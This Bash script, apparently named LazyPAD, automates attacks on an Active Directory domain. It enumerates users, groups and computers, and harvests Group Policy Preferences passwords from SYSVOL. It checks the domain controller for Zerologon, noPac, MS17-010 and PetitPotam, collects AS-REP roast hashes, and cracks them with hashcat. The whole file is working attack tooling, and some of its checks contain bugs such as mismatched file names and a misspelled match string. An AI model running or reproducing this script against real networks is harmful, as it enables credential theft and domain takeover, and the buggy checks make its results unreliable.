#!/usr/bin/bash
tools='crackmapexec bloodhound neo4j bloodhound-python bloodhound-quickwin sprayhound ldapdomaindump jq'
source config.cfg 
source $tool_language
# Directories

mkdir -p $workspace/files
mkdir -p $workspace/Report
mkdir -p $workspace/files/cracking
mkdir -p $dir_tools

# Banner
function banner(){
	tput civis 
	printf "${RED}\n"
	printf "██╗      █████╗ ███████╗██╗   ██╗    ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗     █████╗ 	██████╗    \n"
	printf "██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝    ██╔══██╗	██╔══██╗   \n"
	printf "██║     ███████║  ███╔╝  ╚████╔╝     ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║       ███████║	██║  ██║   \n"
	printf "██║     ██╔══██║ ███╔╝    ╚██╔╝      ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║       ██╔══██║	██║  ██║   \n"
	printf "███████╗██║  ██║███████╗   ██║       ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║       ██║  ██║██╗██████╔╝██╗\n"
	printf "╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝\n${NC}"   
	printf "                 ${BPURPLE}$website${NC}	         			Version $version \n\n"                                                                                                                     
    usage
}

# Functions LazyPAD

# Configurations and Software Check

function check_tools(){
	tput civis 
	printf "⌛ ${BCYAN}$check_software\n\n${NC}"
	for tool in $tools; do
	  printf '%-30s' "🔧 $tool"
	  if hash "$tool" 2>/dev/null; then
	  	sleep 0.5
	    printf "${GREEN}$tool_installed${NC}\n"
	  else
	    printf "${RED}$tool_missing${NC}\n"
	  fi
	done
	tput cnorm
}


function null_enumeration(){
	printf "${BCYAN}$testing_without${NC}\n"
	printf "${BCYAN}$info_dc\n${NC}"
	domaininformation=$(crackmapexec smb $i)
	printf "${BCYAN}Hostname:${NC} "; echo $domaininformation | awk -F ":" '{print $2}' | cut -d ")" -f 1 
	printf "${BCYAN}Domain: ${NC}"; echo $domaininformation | awk -F ":" '{print $3}' | cut -d ")" -f 1 
	printf "${BCYAN}$verify_sysvol${NC}"
	Get-GPPPassword.py -no-pass '$i' >> $workspace/files/NullGPP_Password.output
	grep 'Username\|Password\|File' $workspace/files/NullPassword.output &> /dev/null
	if [ $? == 0 ]; then
	   printf "${RED}[☠️]${NC} ${GREEN}$found_creds${NC}\n"
	else 
	   printf "\n${GREEN}$notfound_creds${NC}\n"
	fi
	
	# Null Session https://www.thehacker.recipes/sys/movement/smb#null-session
	# TODO Detect operative System
}

function active_directory_enum(){
	printf "${BCYAN}$ad_enum\n${NC}"

	sleep 2
	printf "${BCYAN}$users_description\n${NC}"
	users_description
	printf "${BCYAN}$extract_bh\n\n${NC}"
	cd $workspace/files && mkdir bloodhound && cd bloodhound
	bloodhound
	unzip *.zip &> /dev/null
	cd ../../
	sleep 2
	printf "${BCYAN}$ldap_enum\n\n${NC}"
	ldap 
	sleep 2
	printf "${BCYAN}$users_enum\n\n${NC}"
	users_domain
	printf "🔍 ${BCYAN} Searching GPP Passwords \n${NC}"
	gpp_password
	sleep 2
	stats
}

# VULNERABILITY CHECK

function vulnerable(){
	printf "${BCYAN}⌛ Checking vulnerabilities in active Directory\n\n${NC}"
	printf "# Vulnerabilities Active Directory - Domain Controler \n\n" >> $workspace/Report/vulns.md
	printf "| VULNERABLE | DESCRIPTION | EXPLOIT |\n" >> $workspace/Report/vulns.md 
	printf "| ---------- | ----------- | ------- |\n"  >> $workspace/Report/vulns.md
	printf "${GREEN}ZEROLOGON${NC}  -> "
	crackmapexec smb $i -u $u -p $p -d $d -M zerologon | grep VULNERABLE &> /dev/null
	if [ $? == 0 ]; then
	   printf "${RED}[☠️]${NC} ${BCYAN}VULNERABLE${NC}\n"
	   printf "|     ☠️     |  *ZEROLOGON*    | https://github.com/dirkjanm/CVE-2020-1472 | \n" >> $workspace/Report/vulns.md 
	   #printf "Exploit -> https://github.com/dirkjanm/CVE-2020-1472\n"
	else 
	   printf "${RED}[✅] ${GREEN}NO VULNERABLE${NC}\n"
	   printf "|     ✅     |  *ZEROLOGON*    | ------ | \n" >> $workspace/Report/vulns.md
	fi
	
	printf "${GREEN}noPAC${NC}      -> "	                                                                                                                                                             
	crackmapexec smb $i -u $u -p $p -d $d -M noPac | grep VULNEABLE &> /dev/null
	if [ $? == 0 ]; then
      printf "${RED}[☠️]${NC} ${BCYAN}VULNERABLE${NC} \n" 
      printf "|     ☠️     |  *noPAC*    | https://github.com/Ridter/noPac | \n" >> $workspace/Report/vulns.md 
	  #printf "Exploit -> https://github.com/Ridter/noPac\n"
	else 
	   printf "${RED}[✅] ${GREEN}NO VULNERABLE${NC}\n"
	   printf "|     ✅     |  *noPAC*    | ------ | \n" >> $workspace/Report/vulns.md
	fi	
    
	printf "${GREEN}MS17-010${NC}   -> "
	nmap -p 445 --script smb-vuln-ms17-010 $i | grep -i  vulnerable &> /dev/null
	if [ $? == 0 ]; then
	  printf "${RED}[☠️]${NC} ${BCYAN}VULNERABLE${NC} \n"
	  printf "|     ☠️     |  *MS17-010*    | Metasploit? | \n" >> $workspace/Report/vulns.md
	else 
	   printf "${RED}[✅] ${GREEN}NO VULNERABLE${NC}\n"
	   printf "|     ✅     |  *MS17-010*    | ------ | \n" >> $workspace/Report/vulns.md
	fi		

    printf "${GREEN}PetitPotam${NC} -> "                                                                                                                   
	crackmapexec smb $i -u $u -p $p -d $d -M petitpotam | grep VULNERABLE  &> /dev/null
	if [ $? == 0 ]; then
		printf "${RED}[☠️]${NC} ${BCYAN}VULNERABLE${NC}\n"
		printf "|     ☠️     |  *PetitPotam*    | https://github.com/topotam/PetitPotam | \n" >> $workspace/Report/vulns.md
		#printf "Exploit -> https://github.com/topotam/PetitPotam\n" 
	else 
	   printf "${RED}[✅] ${GREEN}NO VULNERABLE${NC}\n"
	   printf "|     ✅     |  *PetitPotam*    | ------ | \n" >> $workspace/Report/vulns.md
	fi
}

# TODO: [CVE-2019-1019 |CVE-2019-1040|CVE-2019-1166|CVE-2019-1338|CVE-2020-1472]

function password_cracking(){
	printf "aaa \n"
	hashcat -m18200 $workspace/files/cracking/hashes.asreproast $wordlist
}

function  attack(){
	#printf " ${BCYAN}Kerberoasting${NC} \n"
    #"GetUserSPNs -request-user",TargetService,"-no-pass"
	printf "⌛ ${BCYAN}Checking Users without Kerberos pre-authentication required${NC} "
	printf "${BCYAN}Without Credentials\n${NC}" 
	crackmapexec ldap $i -u $workspace/files/users.domain -p '' --asreproast $workspace/files/cracking/hashes.asreproast  --kdcHost $i &>/dev/null
	sleep 4
	if [ $? == 0 ]; then
	   printf "${RED}🔥${NC} ${BGREEN} Found Users!!${NC}\n" 
	   awk -F "@" '{print $1}' $workspace/files/cracking/hashes.asreproast | cut -d "$" -f 4 | sed 's/^/[-] /'
	else 
	   printf "${BCYAN}\n Not Found!${NC}\n"
	fi
	printf "${BCYAN}With Credentials\n${NC}" 
	#crackmapexec ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
	#cme ldap 172.16.190.136 -u snifer -p 'Password!' -M get-desc-users --kdcHost 172.16.190.136

}

function  report(){
   read -p "${YELLOW}It's necessary load files bloodhound-python in to Blodhound for continue and Enumeration running. Are you ready ?${NC} (y/n) " ANSWER
   if [ "$ANSWER" = "y" ];
   then
   	  # TODO:
   	  #		 1. Start neo4j 
   	  #    2. Import .json files bloodhound ingestor into neo4j https://sniferl4bs.com/2022/02/reporte-de-posibles-vectores-para-comprometer-un-ad-con-bloodhound-quickwin/
   	  # 	 3. Start bloodhound interface.
   	  #bloodhound-import -du $U -dp $P $workspace/files/bloodhound/*.json
      printf " # Report Lazy Pentest Active Directory \n  ## 👤 Users in Domain \n \n" >>  $workspace/Report/Main.md
      countUsers=$(awk 'END{print NR}' < $workspace/files/users.domain)
      printf " **Users in domain**: $countUsers \n " >> $workspace/Report/Main.md
      printf " # 🐕 Bloodhound Report \n" >> $workspace/Report/Bloodhound.md
      printf "ℹ️ This information is generated with the output of tool: ***[Bloodhound QuickWin](https://github.com/kaluche/bloodhound-quickwin)*** \n" >> $workspace/Report/Bloodhound.md
      printf "⌛ ${BCYAN}Execution Blodhound QuickWin \n${NC}"
      sleep 2
      bloodhound-quickwin -u $bh_user -p $bh_password >> $workspace/files/bloodhound-quickwin.output
      printf "⌛ ${BCYAN}Working ...\n${NC}"
      sleep 2
      sed -i 's/\[34m//g; s/\[0m//g; s/\[93m//g; 's/#//g'; s/\[92m//g; s/\[94m//g; s/\[90m//g; s/\[\*\]/###/g; s/\x1b//g' $workspace/files/bloodhound-quickwin.output
      head -n -20 $workspace/files/bloodhound-quickwin.output >> $workspace/Report/Bloodhound.md
      printf "### Stats \n\n" >> $workspace/Report/Bloodhound.md
      printf "| Description                                | Percentage | Total | \n" >> $workspace/Report/Bloodhound.md
	  printf "| -------------------------------------------|:----------:|:-----:| \n" >> $workspace/Report/Bloodhound.md
      cat $workspace/files/bloodhound-quickwin.output | tail -n14 | tr '+-' ' ' >> $workspace/Report/Bloodhound.md
      ## LDAP RESULTS 

      printf " **Privilege Users** \n" >> $workspace/Report/Main.md 
      cat $workspace/files/privilegeUsers.domain >> $workspace/Report/Main.md
      printf "\n **Users Dont Expire Passwords** \n" >> $workspace/Report/Main.md 
      cat $workspace/files/UsersDonExpirePasswords.domain >> $workspace/Report/Main.md
      printf "⌛ ${BCYAN}Working .....\n${NC}"
      sleep 2
      printf "## Users and Creds in SYSVOL *.xml Files \n" >> $workspace/Report/Sysvol.md
      grep 'Username\|Password\|File' $workspace/files/GPP_Password.output | cut -d "]" -f 2 >> $workspace/Report/Main.md
      grep 'Username\|Password\|File' $workspace/files/NullGPP_Password.output | cut -d "]" -f 2 >> $workspace/Report/Main.md
	  printf " \n ![[Sysvol.md]]" >> $workspace/Report/Main.md
	  printf " \n ![[Bloodhound.md]]" >> $workspace/Report/Main.md

	  ### ASPREPROAST
	  report_aspreproast
	  #printf "**Users ASPReproast:** \n\n"
	  #awk -F "@" '{print $1}' $workspace/files/cracking/hashes.asreproast | cut -d "$" -f 4 | sed 's/^/[+] /' >> $workspace/Report/Asreproast.md

	  printf "${BCYAN}📚 Report Completed! \n ${NC}\n"
	  printf "${BCYAN}¡Cowabunga! 🍕🍕 ${NC}\n"
   elif [[ "$ANSWER" = "n" ]]; then
      printf " BYE!!! "
   fi
}


function change_language(){
	printf "If you change the Language Insert?\n"
	printf " es for Spanish\n"
	printf " en for English\n"
	echo -n "---> "
	read Language

	if [[ $Language == "es" ]]
	then
	  sed -i 's/En/Es/g' config.cfg
	  printf "Idioma cambiado!"
	elif [[ $Language == "en" ]]
	then
	  sed -i 's/Es/En/g' config.cfg
	  printf "Language changed!"
	else
	  echo "The variable is less than 10."
	fi
}

function report_aspreproast(){

	if [ -f $workspace/files/cracking/hashes.asreproast ];
	then
		printf "**Users ASPReproast:** \n\n" >> $workspace/Report/Asreproast.md
		awk -F "@" '{print $1}' $workspace/files/cracking/hashes.asreproast | cut -d "$" -f 4 | sed 's/^/[+] /' >> $workspace/Report/Asreproast.md
	fi
}


# EXECUTION TOOLS 

function users_description(){
	 cme ldap $i -u $u -p $p -M user-desc  --kdcHost $i  
	 cp  $HOME/.cme/logs/UserDesc*.log $workspace/files/Users.description
	 rm  $HOME/.cme/logs/UserDesc*.log
}


function gpp_password(){
	Get-GPPPassword.py $d/$u:$p@$i  >> $workspace/files/GPP_Password.output
	grep 'Username\|Password\|File' $workspace/files/GPP_Password.output &> /dev/null
	if [ $? == 0 ]; then
	   printf "${RED}[☠️]${NC} ${GREEN}Found Credentials!!${NC}\n"
	else 
	   printf "${GREEN}Not Found!${NC}\n"
	fi
}

function bloodhound(){
	bloodhound-python -c All,LoggedOn -d $d -u $u -p $p -ns $i --zip 
	# TODO: Import data in Neo4j
}

function ldap(){
	 
	 ldapdomaindump --user "$d\\$u" --password "$p" $i -o ldapdomaindump
	 mv ldapdomaindump/ files/.
	 cd ..
# TODO: POLITICA DE PASSWORDS. 
#minPwdLength

#s-DS-MachineAccountQuota

}


function users_domain(){
	# crackmapexec smb $i -u $u -p $p -d $d --users | awk -F " " '{print $5}' | cut -d'\' -f2 | tail -n +5 >> $workspace/files/users.domain
	jq '.[].attributes .cn[]' $workspace/files/ldapdomaindump/domain_users.json | sed 's/\"/ /g' > $workspace/files/users.domain
}


function stats(){
	printf "${RED}...... ESTADISTICAS......\n${NC}"
	 printf "${RED}$count_group${NC}" 
	 jq '.[].attributes .name[]' $workspace/files/ldapdomaindump/domain_groups.json | sed 's/\"/ /g' > $workspace/files/groups.domain
	 awk 'END {print NR}' $workspace/files/groups.domain
	 printf "${RED}$computers_domain\n${NC}"
	 jq '.[].attributes .cn[]' $workspace/files/ldapdomaindump/domain_computers.json | sed 's/\"/ /g' > $workspace/files/computers.domain
	 printf "${RED}$count_computers${NC}"
	 awk 'END {print NR}' $workspace/files/computers.domain
	 printf "${RED}TOTAL DE USUARIOS${NC}"
	 awk 'END {print NR}' $workspace/files/users.domain
	 jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' $workspace/files/ldapdomaindump/domain_users.json > $workspace/files/privilegeUsers.domain
	 grep DONT_EXPIRE_PASSWD $workspace/files/ldapdomaindump/domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3}' > $workspace/files/UsersDonExpirePasswords.domain

}

## SOP0RTE LAZYPAD: KALI, PARROT, ARCH
## DEBIAN. UBUNTU, ARCH
function detect_root(){
	if [[ "$EUID" -ne 0 ]]
	then
		printf "${RED}$m_root${NC} ${BGREEN}$m_sudo${NC}"
		exit 1
	fi
}



function install_tools(){
	printf "Instalando Crackmapexec"
	install_crackmapexec
	printf "Instalando Sprayhound"
	install_sprayhound
	printf "Instalando Bloodhound QuickWin"
	install_bloodhound-quickwin
	printf "Instalando Ldapdomaindump"
	install_ldapdomaindump
	printf "Instalando Responder3"
	install_responder3
	printf "Instalando neo4j"
  printf "Instlaando Bloodhound"

}



### COPY FROM EXEGOL FRAMEWORK 


function install_crackmapexec() {
  printf "Installing CrackMapExec"
  git -C $dir_tools clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
  cd $dir_tools/CrackMapExec
  # Redefining baseDN from domain name instead of KDC
  curl --location https://github.com/byt3bl33d3r/CrackMapExec/pull/535.patch | git apply --verbose
  python3 -m pipx install .
}

function install_bloodhound-quickwin() {
  printf "Installing bloodhound-quickwin"
  python3 -m pip install py2neo pandas prettytable
  git -C $dir_tools clone https://github.com/kaluche/bloodhound-quickwin
}

function install_ldapdomaindump() {
  printf "Installing ldapdomaindump"
  pip install ldapdomaindump
}

function install_responder3() {
  printf "Installing Responder3"
  git -C $dir_tools clone https://github.com/skelsec/Responder3.git
  cd Responder3
  python3 -m pip install -r requirements.txt
  python3 setup.py install
}

function install_sprayhound() {
  printf "Installing Sprayhound"
  python3 -m pip install sprayhound
}


##########################################

function update_deb(){
	printf "${RED}$update_os${NC}"
	apt-get -y update &>/dev/null && apt-get -y install apt-utils &>/dev/null && apt-get -y upgrade &>/dev/null && apt-get -y autoremove &>/dev/null && apt-get clean &>/dev/null
	apt-get -y install libssl-dev libffi-dev python2-dev build-essential python3-winrm python3-venv libsasl2-dev libldap2-dev 
  install_tools
}

function update_arch(){
	printf "${RED}$update_os${NC}"
	printf "Work in progress..."
	#pacman -Syyu --noconfirm &>/dev/null
}

function detect_distribution(){
	distribution=$(grep "ubuntu" /etc/os-release | head -n 1 |awk -F "=" '{print $2}')
	if [[ $(grep "ubuntu" /etc/os-release | head -n 1 |awk -F "=" '{print $2}') == "ubuntu" ]]
	then
		install_ubuntu
	elif [[ $(grep "kali" /etc/os-release | head -n 1 |awk -F "=" '{print $2}') == "kali" ]]
		then
			install_kali
	elif [[ $distribution == "arch" ]]
		then
			install_arch
	elif [[ $distribution == "parrot" ]]
		then 
			install_parrot
	else 
		echo "DISTRIBUCION SIN SOPORTE"
	fi
    }


function install_kali(){
	detect_root
	printf "${BGREEN}$m_installing${NC}\n"
	update_deb

}

function install_ubuntu(){
	detect_root
	printf "${BGREEN}${NC}"
	update_deb
}

function install_parrot(){
	detect_root
	printf "${BGREEN}${NC}"
	update_deb
}

function install_arch(){
	detect_root
	printf "${BGREEN}${NC}"
	update_arch
}


function usage {
       printf "\n${BRED}$m_arguments:${NC}\n"
       printf "	-d    		$m_domain.\n"
       printf "	-i    		$m_ip.\n"
       printf "	-u    		$m_user\n"
       printf "	-p    		$m_password\n"
       printf "	-h    		$m_help\n"
   	   printf "${BRED}$m_functions:${NC}\n" 
   	   printf "	-N    		NULL SESSION.\n"
   	   printf "	-E    		$m_enumAD\n"
   	   printf "	-V    		$m_verifyAD\n"
   	   printf "	-C    		$m_cracking\n"
       printf "	-F    		$m_fullAD\n"
   	   printf " 	-A		$m_attackAD\n"
   	   printf " 	-R		$m_genreport\n"
   	   printf " 	-T		$m_checktool\n"
   	   printf " 	-L		$m_language \n"
   	   printf "\n${BRED}$m_usage${NC}\n\n"
   	   printf "${BYELLOW}$m_verifytools${NC}\n"
   	   printf "             LazyPAD.sh -T \n"
   	   printf "${BYELLOW}$m_nullsession:${NC}\n"
	   printf "             LazyPAD.sh -i <DIRECCION-IP> -N\n\n"
   	   printf "${BYELLOW}$m_enumad ${NC}\n"
   	   printf "             LazyPAD.sh -u <user> -p <password> -d <domain> -i <IP-DC> -E \n\n"
   	   printf "${BYELLOW}$m_vulnad${NC}\n"
       printf "             LazyPAD.sh -u <user> -p <password> -d <domain> -i <IP DC> -V \n\n"
   	   printf "${BYELLOW}$m_report${NC}\n"
   	   printf "             LazyPAD.sh  -R			   \n\n"
   	   printf "${BYELLOW}$m_language${NC}\n"
   	   printf "             LazyPAD.sh  -L			   \n\n"
   	   
   	   printf " \n"

   	   printf "\nDefault all data saved in Folder $1workspace"
   	   tput cnorm
       exit 0
}
[ $# = 0 ] && banner "  >>>>>>>> no options"

while getopts ":d:i:u:p:U:P:NEVCFARTL" o; do
    case "${o}" in
    	d)
			d=${OPTARG}
			;;    	
    	i)
			i=${OPTARG}
			;;
        u)
            u=${OPTARG}
            ;;
        p)
            p=${OPTARG}
            ;;
        U)
            U=${OPTARG}
            ;;
        P)
            P=${OPTARG}
            ;;
        N)
            null_enumeration
            ;;        
        E)
            active_directory_enum
            ;;
        V)
            vulnerable
            ;;
        T)
            detect_distribution
            ;;            
        F)
            
            ;;
        A)
           	attack
            ;;
        R)
            report
            ;;
        L)
            change_language
            ;;
        *)
            banner
            ;;
    esac
done
if [ $OPTIND -eq 1 ]; 
	then 
		echo "Missing arguments";
	fi
shift $((OPTIND-1))



# 
# link symbolic
# ln -s /opt/tools/bloodhound-quickwin/bhqc.py /usr/bin/bloodhound-quickwin 
#
#


# Notification

	   #Message="🔥 Found users Kerberoasting"
	   #ncurl -s -X POST $URL -d chat_id=$ID -d text="$Message"
